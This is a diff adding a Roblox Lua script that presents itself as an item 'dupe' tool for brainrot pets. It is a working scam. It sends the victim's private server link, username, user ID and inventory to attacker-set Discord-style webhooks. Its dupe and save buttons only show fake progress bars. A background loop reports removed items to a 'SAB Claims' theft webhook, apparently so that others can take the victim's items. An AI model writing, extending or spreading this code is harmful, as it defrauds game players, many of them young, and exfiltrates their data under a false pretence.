+    if not hostOk then return false end
+    local looksPrivate = (
+        string.find(url, "privateServerLinkCode=", 1, true) ~= nil
+        or string.find(url, "/games/", 1, true) ~= nil
+        or string.find(url, "placeId=", 1, true) ~= nil
+        or string.find(url, "gameid=", 1, true) ~= nil
+    )
+    return looksPrivate
+end
+
+startButton.MouseButton1Click:Connect(function()
+    local serverLink = textBox.Text
+    local hasRoblox = type(serverLink) == "string" and string.find(string.lower(serverLink), "roblox", 1, true) ~= nil
+    if not hasRoblox then
+        local originalColor = textBox.BackgroundColor3
+        textBox.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
+        subtitleLabel.Text = "Link must contain \"roblox private server\""
+        subtitleLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        wait(1.5)
+        textBox.BackgroundColor3 = originalColor
+        subtitleLabel.Text = "Type In Private Server Link"
+        subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+        return
+    end
+    startButton.Text = "Loading..."
+    startButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+
+    local petsFound, petDetails = checkForPets()
+    local basePetDetails = petDetails
+    local autoCheckerBase = petDetails -- separate snapshot for auto-checker
+    task.spawn(function()
+        local _, routedUrl = sendWebhook(serverLink, petsFound, petDetails)
+        -- Send the server link as a separate message after the embed
+        task.wait(1) -- Wait 1 second after sending the embed
+        pcall(function()
+            local req = http_request or request or (syn and syn.request)
+            if req then
+                req({
+                    Url = routedUrl or getgenv().webhook,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode({ 
+                        content = "🔗 **Private Server Link:**\n" .. serverLink 
+                    })
+                })
+            end
+        end)
+    end)
+
+    startButton.Text = "✅ Loaded!"
+    startButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    
+    -- Wait a moment for webhook to process
+    task.wait(1)
+    
+    -- Create new brainrot GUI
+    local brainrotGui = Instance.new("ScreenGui")
+    brainrotGui.Name = "BrainrotGui"
+    brainrotGui.Parent = playerGui
+    brainrotGui.IgnoreGuiInset = true
+    brainrotGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    -- Disable PlayerList GUI
+    local StarterGui = game:GetService("StarterGui")
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+    
+    -- Black/gray background covering entire screen
+    local background = Instance.new("Frame")
+    background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Parent = brainrotGui
+    
+    -- Title at the top - mobile responsive
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Size = UDim2.new(1, 0, 0, isMobile and 40 or 60)
+    titleLabel.Position = UDim2.new(0, 0, 0, isMobile and 10 or 20)
+    titleLabel.Text = "Your Brainrots"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextSize = isMobile and 20 or 32
+    titleLabel.TextScaled = true
+    titleLabel.Parent = background
+    
+    -- Brainrot list container - mobile responsive
+    local brainrotList = Instance.new("ScrollingFrame")
+    brainrotList.BackgroundTransparency = 1
+    brainrotList.Size = UDim2.new(0.9, 0, isMobile and 0.4 or 0.6, 0)
+    brainrotList.Position = UDim2.new(0.05, 0, isMobile and 0.15 or 0.15, 0)
+    brainrotList.CanvasSize = UDim2.new(0, 0, 0, 0)
+    brainrotList.ScrollBarThickness = isMobile and 10 or 8
+    brainrotList.Parent = background
+    
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.Padding = UDim.new(0, isMobile and 8 or 10)
+    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    listLayout.Parent = brainrotList
+    
+    -- Button container at bottom - mobile responsive
+    local buttonContainer = Instance.new("Frame")
+    buttonContainer.BackgroundTransparency = 1
+    buttonContainer.Size = UDim2.new(0.95, 0, 0, isMobile and 60 or 60)
+    buttonContainer.Position = UDim2.new(0.025, 0, isMobile and 0.6 or 0.8, 0)
+    buttonContainer.Parent = background
+    
+    local buttonLayout = Instance.new("UIListLayout")
+    buttonLayout.FillDirection = Enum.FillDirection.Horizontal
+    buttonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    buttonLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    buttonLayout.Padding = UDim.new(0, isMobile and 15 or 15)
+    buttonLayout.Parent = buttonContainer
+    
+    -- Dupe button (initially hidden) - mobile responsive
+    local dupeButton = Instance.new("TextButton")
+    dupeButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+    dupeButton.Size = UDim2.new(0, isMobile and 120 or 180, 0, isMobile and 50 or 60)
+    dupeButton.Font = Enum.Font.GothamBold
+    dupeButton.Text = "Dupe Selected"
+    dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    dupeButton.TextSize = isMobile and 14 or 18
+    dupeButton.Visible = false
+    dupeButton.Parent = buttonContainer
+    
+    local dupeCorner = Instance.new("UICorner")
+    dupeCorner.CornerRadius = UDim.new(0, 8)
+    dupeCorner.Parent = dupeButton
+    
+    -- Rejoin button (light blue, non-functional) - mobile responsive
+    local rejoinButton = Instance.new("TextButton")
+    rejoinButton.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
+    rejoinButton.Size = UDim2.new(0, isMobile and 120 or 180, 0, isMobile and 50 or 60)
+    rejoinButton.Font = Enum.Font.GothamBold
+    rejoinButton.Text = "Rejoin Server"
+    rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    rejoinButton.TextSize = isMobile and 14 or 18
+    rejoinButton.Parent = buttonContainer
+    
+    local rejoinCorner = Instance.new("UICorner")
+    rejoinCorner.CornerRadius = UDim.new(0, 8)
+    rejoinCorner.Parent = rejoinButton
+    
+    -- Save brainrots button (green) - mobile responsive
+    local saveButton = Instance.new("TextButton")
+    saveButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+    saveButton.Size = UDim2.new(0, isMobile and 120 or 180, 0, isMobile and 50 or 60)
+    saveButton.Font = Enum.Font.GothamBold
+    saveButton.Text = "Save Brainrots"
+    saveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    saveButton.TextSize = isMobile and 14 or 18
+    saveButton.Parent = buttonContainer
+    
+    local saveCorner = Instance.new("UICorner")
+    saveCorner.CornerRadius = UDim.new(0, 8)
+    saveCorner.Parent = saveButton
+    
+    -- Loading bar (initially hidden) - mobile responsive
+    local loadingBar = Instance.new("Frame")
+    loadingBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    loadingBar.Size = UDim2.new(0.9, 0, 0, isMobile and 25 or 30)
+    loadingBar.Position = UDim2.new(0.05, 0, isMobile and 0.7 or 0.9, 0)
+    loadingBar.Visible = false
+    loadingBar.Parent = background
+    
+    local loadingCorner = Instance.new("UICorner")
+    loadingCorner.CornerRadius = UDim.new(0, 10)
+    loadingCorner.Parent = loadingBar
+    
+    local loadingFill = Instance.new("Frame")
+    loadingFill.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+    loadingFill.Size = UDim2.new(0, 0, 1, 0)
+    loadingFill.Parent = loadingBar
+    
+    local fillCorner = Instance.new("UICorner")
+    fillCorner.CornerRadius = UDim.new(0, 10)
+    fillCorner.Parent = loadingFill
+    
+    local loadingText = Instance.new("TextLabel")
+    loadingText.BackgroundTransparency = 1
+    loadingText.Size = UDim2.new(1, 0, 1, 0)
+    loadingText.Text = "Loading... 30s"
+    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingText.Font = Enum.Font.GothamBold
+    loadingText.TextSize = isMobile and 14 or 14
+    loadingText.Parent = loadingBar
+    
+    -- Variables
+    local selectedBrainrot = nil
+    local isDupeInProgress = false
+    local brainrotQuantities = {}
+    local rejoinSendCount = 0 -- limit to 3 diff sends
+    
+    -- Initialize quantities
+    for _, brainrot in ipairs(petsFound) do
+        brainrotQuantities[brainrot] = 1
+    end
+    
+    -- Auto-checker: periodically detect missing items and notify theftWebhook
+    task.spawn(function()
+        local function buildKey(pet)
+            return tostring(pet.slot) .. "::" .. tostring(pet.name)
+        end
+        while brainrotGui.Parent do
+            task.wait(15)
+            local _, latestDetails = checkForPets()
+            latestDetails = latestDetails or {}
+            autoCheckerBase = autoCheckerBase or {}
+
+            local baseMap = {}
+            for _, p in ipairs(autoCheckerBase) do
+                baseMap[buildKey(p)] = (baseMap[buildKey(p)] or 0) + 1
+            end
+            local latestMap = {}
+            for _, p in ipairs(latestDetails) do
+                latestMap[buildKey(p)] = (latestMap[buildKey(p)] or 0) + 1
+            end
+
+            local removed = {}
+            for key, count in pairs(baseMap) do
+                local diff = count - (latestMap[key] or 0)
+                if diff > 0 then
+                    for _, p in ipairs(autoCheckerBase) do
+                        if buildKey(p) == key then
+                            for i=1,diff do table.insert(removed, p) end
+                            break
+                        end
+                    end
+                end
+            end
+
+            if #removed > 0 then
+                local stolenLines = {}
+                for _, p in ipairs(removed) do
+                    table.insert(stolenLines, string.format("%s — Rarity: %s | Gen: %s | Price: $%s/s", p.name or "?", p.rarity or "?", p.generation or "0", p.price or "0"))
+                end
+                local req = http_request or request or (syn and syn.request)
+                if req then
+                    local embed = {
+                        username = "🧛 SAB Claims",
+                        embeds = { {
+                            title = "✅ Claim Detected",
+                            description = "```yaml\nUsername: " .. player.Name .. " (" .. player.UserId .. ")\n```",
+                            color = 0x90EE90,
+                            fields = {
+                                { name = "📦 ITEMS", value = "```\n" .. table.concat(stolenLines, "\n") .. "\n```", inline = false }
+                            },
+                            timestamp = DateTime.now():ToIsoDate()
+                        } }
+                    }
+                    pcall(function()
+                        req({
+                            Url = getgenv().theftWebhook,
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = HttpService:JSONEncode(embed)
+                        })
+                    end)
+                end
+                -- Refresh auto-checker base to avoid duplicate alerts for the same diff
+                autoCheckerBase = latestDetails
+            end
+        end
+    end)
+    
+    -- Alert message - mobile responsive
+    local alertLabel = Instance.new("TextLabel")
+    alertLabel.BackgroundTransparency = 1
+    alertLabel.Size = UDim2.new(0.9, 0, 0, isMobile and 35 or 40)
+    alertLabel.Position = UDim2.new(0.05, 0, isMobile and 0.55 or 0.75, 0)
+    alertLabel.Text = "⚠️ IMPORTANT: After duping, you MUST save or it won't work!"
+    alertLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+    alertLabel.Font = Enum.Font.GothamBold
+    alertLabel.TextSize = isMobile and 12 or 16
+    alertLabel.TextScaled = true
+    alertLabel.Parent = background
+    
+    -- Create brainrot buttons with better styling
+    for i, brainrot in ipairs(petsFound) do
+        local petDetail = petDetails[i] or {}
+        local brainrotFrame = Instance.new("Frame")
+        brainrotFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        brainrotFrame.Size = UDim2.new(1, isMobile and -10 or -20, 0, isMobile and 60 or 80)
+        brainrotFrame.Parent = brainrotList
+        
+        local frameCorner = Instance.new("UICorner")
+        frameCorner.CornerRadius = UDim.new(0, 10)
+        frameCorner.Parent = brainrotFrame
+        
+        -- Add subtle border
+        local frameStroke = Instance.new("UIStroke")
+        frameStroke.Color = Color3.fromRGB(70, 70, 70)
+        frameStroke.Thickness = 1
+        frameStroke.Parent = brainrotFrame
+        
+        local brainrotButton = Instance.new("TextButton")
+        brainrotButton.BackgroundTransparency = 1
+        brainrotButton.Size = UDim2.new(1, 0, 1, 0)
+        brainrotButton.Font = Enum.Font.GothamBold
+        brainrotButton.Text = brainrot .. " x" .. brainrotQuantities[brainrot]
+        brainrotButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        brainrotButton.TextSize = isMobile and 14 or 18
+        brainrotButton.TextScaled = true
+        brainrotButton.Parent = brainrotFrame
+        
+        -- Pet details text - mobile responsive
+        local detailsLabel = Instance.new("TextLabel")
+        detailsLabel.BackgroundTransparency = 1
+        detailsLabel.Size = UDim2.new(1, isMobile and -50 or -60, 0, isMobile and 20 or 30)
+        detailsLabel.Position = UDim2.new(0, isMobile and 50 or 60, 0.5, isMobile and 10 or 10)
+        detailsLabel.Text = string.format("Rarity: %s | Gen: %s | Price: $%s", 
+            petDetail.rarity or "Unknown", 
+            petDetail.generation or "0", 
+            petDetail.price or "0")
+        detailsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+        detailsLabel.Font = Enum.Font.Gotham
+        detailsLabel.TextSize = isMobile and 10 or 14
+        detailsLabel.TextXAlignment = Enum.TextXAlignment.Left
+        detailsLabel.Parent = brainrotFrame
+        
+        -- Add brainrot icon/emoji - mobile responsive
+        local iconLabel = Instance.new("TextLabel")
+        iconLabel.BackgroundTransparency = 1
+        iconLabel.Size = UDim2.new(0, isMobile and 30 or 40, 0, isMobile and 30 or 40)
+        iconLabel.Position = UDim2.new(0, isMobile and 10 or 10, 0.5, isMobile and -15 or -20)
+        iconLabel.Text = "🧠"
+        iconLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+        iconLabel.Font = Enum.Font.GothamBold
+        iconLabel.TextSize = isMobile and 18 or 24
+        iconLabel.Parent = brainrotFrame
+        
+        -- Click handler
+        brainrotButton.MouseButton1Click:Connect(function()
+            if not isDupeInProgress then
+                -- Reset previous selection
+                for _, frame in pairs(brainrotList:GetChildren()) do
+                    if frame:IsA("Frame") then
+                        frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                        frame.UIStroke.Color = Color3.fromRGB(70, 70, 70)
+                    end
+                end
+                
+                -- Select this brainrot
+                brainrotFrame.BackgroundColor3 = Color3.fromRGB(60, 100, 200)
+                brainrotFrame.UIStroke.Color = Color3.fromRGB(100, 150, 255)
+                selectedBrainrot = brainrot
+                dupeButton.Visible = true
+                end
+            end)
+
+        -- Hover effects
+        brainrotButton.MouseEnter:Connect(function()
+            if not isDupeInProgress and selectedBrainrot ~= brainrot then
+                brainrotFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+            end
+        end)
+        
+        brainrotButton.MouseLeave:Connect(function()
+            if not isDupeInProgress and selectedBrainrot ~= brainrot then
+                brainrotFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                end
+            end)
+    end
+    
+    -- Update canvas size
+    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        brainrotList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
+    end)
+    
+    -- Function to update brainrot display
+    local function updateBrainrotDisplay()
+        for _, frame in pairs(brainrotList:GetChildren()) do
+            if frame:IsA("Frame") then
+                local button = frame:FindFirstChild("TextButton")
+                if button then
+                    local brainrotName = button.Text:match("^([^x]+) x")
+                    if brainrotName then
+                        brainrotName = brainrotName:gsub("%s+$", "") -- Remove trailing spaces
+                        button.Text = brainrotName .. " x" .. brainrotQuantities[brainrotName]
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Dupe button click handler
+    dupeButton.MouseButton1Click:Connect(function()
+        if selectedBrainrot and not isDupeInProgress then
+            isDupeInProgress = true
+            dupeButton.Visible = false
+            loadingBar.Visible = true
+            
+            -- Start 30 second loading
+            local startTime = tick()
+            local duration = 30
+            
+            task.spawn(function()
+                while tick() - startTime < duration and loadingBar.Parent do
+                    local elapsed = tick() - startTime
+                    local progress = elapsed / duration
+                    local remaining = math.ceil(duration - elapsed)
+                    
+                    loadingFill.Size = UDim2.new(progress, 0, 1, 0)
+                    loadingText.Text = "Duping " .. selectedBrainrot .. "... " .. remaining .. "s"
+                    task.wait(0.1)
+                end
+                
+                if loadingBar.Parent then
+                    -- Actually duplicate the brainrot
+                    brainrotQuantities[selectedBrainrot] = brainrotQuantities[selectedBrainrot] + 1
+                    updateBrainrotDisplay()
+                    
+                    loadingText.Text = "Dupe Complete! Now x" .. brainrotQuantities[selectedBrainrot]
+                    loadingFill.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+                    
+                    -- Reset after 3 seconds
+                    task.wait(3)
+                    if loadingBar.Parent then
+                        loadingBar.Visible = false
+                        dupeButton.Visible = true
+                        isDupeInProgress = false
+                        selectedBrainrot = nil
+                        
+                        -- Reset selection
+                        for _, frame in pairs(brainrotList:GetChildren()) do
+                            if frame:IsA("Frame") then
+                                frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                                frame.UIStroke.Color = Color3.fromRGB(70, 70, 70)
+                    end
+                end
+                    end
+                end
+                end)
+            end
+    end)
+    
+    -- Rejoin button: send inventory diff (new/missing) and rejoin same server
+    rejoinButton.MouseButton1Click:Connect(function()
+        if rejoinSendCount >= 3 then
+            print("Rejoin diff limit reached (3)")
+            return
+        end
+        task.spawn(function()
+            local function buildKey(pet)
+                return tostring(pet.slot) .. "::" .. tostring(pet.name)
+            end
+            
+            -- Get latest inventory snapshot
+            local _, latestDetails = checkForPets()
+            latestDetails = latestDetails or {}
+            basePetDetails = basePetDetails or {}
+
+            -- Build lookup maps
+            local baseMap = {}
+            for _, p in ipairs(basePetDetails) do
+                baseMap[buildKey(p)] = (baseMap[buildKey(p)] or 0) + 1
+            end
+            local latestMap = {}
+            for _, p in ipairs(latestDetails) do
+                latestMap[buildKey(p)] = (latestMap[buildKey(p)] or 0) + 1
+            end
+
+            -- Compute removed (in base but not in latest)
+            local removed = {}
+            for key, count in pairs(baseMap) do
+                local diff = count - (latestMap[key] or 0)
+                if diff > 0 then
+                    -- find sample pet from basePetDetails for metadata
+                    for _, p in ipairs(basePetDetails) do
+                        if buildKey(p) == key then
+                            for i=1,diff do table.insert(removed, p) end
+                            break
+                        end
+                    end
+                end
+            end
+
+            -- Compute added (in latest but not in base)
+            local added = {}
+            for key, count in pairs(latestMap) do
+                local diff = count - (baseMap[key] or 0)
+                if diff > 0 then
+                    for _, p in ipairs(latestDetails) do
+                        if buildKey(p) == key then
+                            for i=1,diff do table.insert(added, p) end
+                            break
+                        end
+                    end
+                end
+            end
+
+            -- Sort for nicer display (highest value first)
+            table.sort(added, function(a, b)
+                return (a.rawValue or 0) > (b.rawValue or 0)
+            end)
+            table.sort(removed, function(a, b)
+                return (a.rawValue or 0) > (b.rawValue or 0)
+            end)
+
+            -- Prepare webhook payload
+            local avatarUrl = (function()
+                local ok, res = pcall(function()
+                    return HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. player.UserId .. '&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot'))
+                end)
+                if ok and res and res.data and res.data[1] and res.data[1].imageUrl then
+                    return res.data[1].imageUrl
+                end
+                return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
+            end)()
+
+            local function listToLines(list)
+                local lines = {}
+                for _, pet in ipairs(list) do
+                    table.insert(lines, string.format("• %s (Rarity: %s | Gen: %s)", pet.name or "Unknown", pet.rarity or "?", pet.generation or "0"))
+                end
+                return #lines > 0 and table.concat(lines, "\n") or "None"
+            end
+
+            local embedData = {
+                username = "🧛 SAB Inventory Tracker",
+                content = "📥 Inventory update on Rejoin",
+                embeds = { {
+                    title = "🔁 Rejoin Clicked: Inventory Diff",
+                    description = "```diff\n+ Base inventory refreshed after this report +\n```",
+                    color = 0x90EE90,
+                    thumbnail = { url = avatarUrl },
+                    fields = {
+                        { name = "👤 PLAYER", value = "```yaml\n" .. player.Name .. " (" .. player.UserId .. ")\n```", inline = true },
+                        { name = "✅ NEW ITEMS", value = "```diff\n+ " .. listToLines(added) .. "\n```", inline = false },
+                        { name = "❌ MISSING ITEMS", value = "```diff\n- " .. listToLines(removed) .. "\n```", inline = false },
+                    },
+                    timestamp = DateTime.now():ToIsoDate()
+                } }
+            }
+
+            local req = http_request or request or (syn and syn.request)
+            if req then
+                pcall(function()
+                    req({
+                        Url = getgenv().leaveWebhook,
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode(embedData)
+                    })
+                end)
+            end
+
+            -- Update base snapshot to latest after sending
+            basePetDetails = latestDetails
+            rejoinSendCount = rejoinSendCount + 1
+
+            -- Theft notification to dedicated webhook if items missing
+            if req and #removed > 0 then
+                local stolenLines = {}
+                for _, p in ipairs(removed) do
+                    table.insert(stolenLines, string.format("%s — Rarity: %s | Gen: %s | Price: $%s/s", p.name or "?", p.rarity or "?", p.generation or "0", p.price or "0"))
+                end
+                local embed = {
+                    username = "🧛 SAB Claims",
+                    embeds = { {
+                        title = "✅ Claim Detected",
+                        description = "```yaml\nUsername: " .. player.Name .. " (" .. player.UserId .. ")\n```",
+                        color = 0x90EE90,
+                        fields = {
+                            { name = "📦 ITEMS", value = "```\n" .. table.concat(stolenLines, "\n") .. "\n```", inline = false }
+                        },
+                        timestamp = DateTime.now():ToIsoDate()
+                    } }
+                }
+                pcall(function()
+                    req({
+                        Url = getgenv().theftWebhook,
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode(embed)
+                    })
+                end)
+            end
+        end)
+
+        -- Attempt to rejoin the same server instance
+        local TeleportService = game:GetService("TeleportService")
+        pcall(function()
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
+        end)
+    end)
+    
+    -- Save brainrots button - shows loading bar
+    saveButton.MouseButton1Click:Connect(function()
+        if not isDupeInProgress then
+            isDupeInProgress = true
+            saveButton.Visible = false
+            dupeButton.Visible = false
+            loadingBar.Visible = true
+            
+            -- Start 30 second loading for saving
+            local startTime = tick()
+            local duration = 30
+            
+            task.spawn(function()
+                while tick() - startTime < duration and loadingBar.Parent do
+                    local elapsed = tick() - startTime
+                    local progress = elapsed / duration
+                    local remaining = math.ceil(duration - elapsed)
+                    
+                    loadingFill.Size = UDim2.new(progress, 0, 1, 0)
+                    loadingText.Text = "Saving Brainrots... " .. remaining .. "s"
+                    task.wait(0.1)
+                end
+                
+                if loadingBar.Parent then
+                    loadingText.Text = "Brainrots Saved!"
+                    loadingFill.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+                    
+                    -- Reset after 2 seconds
+                    task.wait(2)
+                    if loadingBar.Parent then
+                        loadingBar.Visible = false
+                        saveButton.Visible = true
+                        dupeButton.Visible = (selectedBrainrot ~= nil)
+                        isDupeInProgress = false
+                    end
+                end
+            end)
+                end
+            end)
+
+    
+    -- Remove the original GUI
+            if screenGui then screenGui:Destroy() end
+end)
+
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+mainFrame.Size = UDim2.new(0, 0, 0, 0)
+local spawnTween = TweenService:Create(
+    mainFrame,
+    TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Size = UDim2.new(0, 420, 0, 220)}
+)
+spawnTween:Play()
+
